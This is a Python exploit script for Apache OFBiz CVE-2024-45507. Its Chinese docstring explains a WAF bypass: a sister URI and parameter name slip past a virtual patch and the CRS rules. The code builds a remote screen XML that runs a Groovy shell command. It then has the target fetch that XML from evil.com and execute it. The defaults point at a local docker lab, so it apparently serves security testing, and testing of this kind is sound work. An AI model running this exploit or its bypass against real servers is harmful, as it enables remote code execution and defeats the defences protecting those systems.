# -*- coding: utf-8 -*-
"""OFBiz CVE-2024-45507 WAF 绕过（姊妹向量，已实测完整绕过 CRS+虚拟补丁 3003）。

原理：虚拟补丁 3003 锚定 URI 含 `StatsSinceStart` 且参数 `statsDecoratorLocation`
为 http(s) URL。姊妹入口 `findTemporalExpression`（同根因：装饰器位置来自用户参数）
使用**不同 URI + 不同参数名** `tempExprDecoratorLocation`，两个锚全部落空；
CRS 基线对普通表单参数为 0 分 → 完整绕过。
远程 XML 的 screen name 需为 `TemporalExpressionDecorator`（实测，其余名只 SSRF 不执行）。

用法：python ofbiz_temporal_bypass.py [--port 18381] [--cmd "touch /tmp/pwn"]
"""
import argparse
import io
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from common import session  # noqa: E402

XML_TPL = """<?xml version="1.0" encoding="UTF-8"?>
<screens xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns="http://ofbiz.apache.org/Widget-Screen" xsi:schemaLocation="http://ofbiz.apache.org/Widget-Screen http://ofbiz.apache.org/dtds/widget-screen.xsd">
    <screen name="TemporalExpressionDecorator">
        <section>
            <actions>
                <set value="${{groovy:{expr}}}"/>
            </actions>
        </section>
    </screen>
</screens>
"""


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=18381)
    ap.add_argument("--cmd", default="touch /tmp/pwn_ofbiz_temporal")
    ap.add_argument("--uri", default="/webtools/control/main/findTemporalExpression")
    a = ap.parse_args()

    expr = "'%s'.execute()" % a.cmd
    xml = XML_TPL.format(expr=expr)
    fname = "ofbiz_temporal_bypass.xml"
    www = os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                        "..", "..", "infrastructure", "www", "payloads"))
    os.makedirs(www, exist_ok=True)
    io.open(os.path.join(www, fname), "w", encoding="utf-8").write(xml)

    s = session()
    r = s.post("https://127.0.0.1:%d%s" % (a.port, a.uri),
               data={"tempExprDecoratorLocation":
                     "http://evil.com:8000/payloads/%s" % fname},
               headers={"User-Agent": "Mozilla/5.0"},
               timeout=30, allow_redirects=False)
    print("[*] %s -> HTTP %s (%dB)" % (a.uri, r.status_code, len(r.content)))
    print("[*] 真值核查: docker compose --profile ofbiz exec ofbiz ls -l --full-time /tmp")


if __name__ == "__main__":
    main()
